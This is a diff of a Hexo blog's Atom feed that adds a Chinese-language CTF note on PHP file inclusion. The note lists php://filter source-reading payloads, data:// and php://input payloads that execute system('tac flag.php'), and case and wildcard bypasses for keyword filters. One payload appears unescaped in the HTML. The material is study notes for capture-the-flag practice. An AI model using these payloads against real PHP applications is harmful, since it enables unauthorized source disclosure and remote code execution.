@@ -6,7 +6,7 @@
   <link href="http://1768161086.github,io/atom.xml" rel="self"/>
   
   <link href="http://1768161086.github,io/"/>
-  <updated>2025-01-21T02:44:35.630Z</updated>
+  <updated>2025-02-09T06:54:15.295Z</updated>
   <id>http://1768161086.github,io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://1768161086.github,io/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <id>http://1768161086.github,io/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
+    <published>2025-01-25T12:21:10.593Z</published>
+    <updated>2025-02-09T06:54:15.295Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>文件包含相关知识点总结</p></blockquote><h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="1-php-filter"><a href="#1-php-filter" class="headerlink" title="1.php:&#x2F;&#x2F;filter"></a>1.php:&#x2F;&#x2F;filter</h2><p>php:&#x2F;&#x2F;filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p><p>base64过滤器:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>从字符串中去除html和php标记:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=index.php</span><br></pre></td></tr></table></figure><p>将内容转换为大小写:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.toupper（tolower）/resource=index.php</span><br></pre></td></tr></table></figure><p>对字符串执行rot13变换:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=string.rot13/resource=index.php</span><br></pre></td></tr></table></figure><p>转换为8-bit字符串:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.quoted-prinrable-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>对字符从utf-8到utf-7转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7/resource=index.php</span><br></pre></td></tr></table></figure><h2 id="2-data"><a href="#2-data" class="headerlink" title="2.data:&#x2F;&#x2F;"></a>2.data:&#x2F;&#x2F;</h2><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;或&lt;?=system(&quot;tac flag.php&quot;);?&gt;或&lt;?=`tac flag.php`;</span><br></pre></td></tr></table></figure><?=system("tac flag.php");?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure><h1 id="文件包换相关过滤"><a href="#文件包换相关过滤" class="headerlink" title="文件包换相关过滤"></a>文件包换相关过滤</h1><h2 id="1-过滤php可用大写替换："><a href="#1-过滤php可用大写替换：" class="headerlink" title="1.过滤php可用大写替换："></a>1.过滤php可用大写替换：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?Php system(&#x27;tac fla*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="2-同时过滤date"><a href="#2-同时过滤date" class="headerlink" title="2.同时过滤date:"></a>2.同时过滤date:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=pHp://input然后post写入&lt;?php system(&#x27;tac fl*&#x27;)?&gt;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;文件包含相关知识点总结&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&quot;php伪协议&quot;&gt;&lt;a href=&quot;#php伪协议&quot; class=&quot;headerlink&quot; title=&quot;php伪协议&quot;&gt;&lt;/a&gt;php伪协议&lt;/h1&gt;&lt;h2 id=&quot;1-p</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>ctfshow web80文件包含</title>
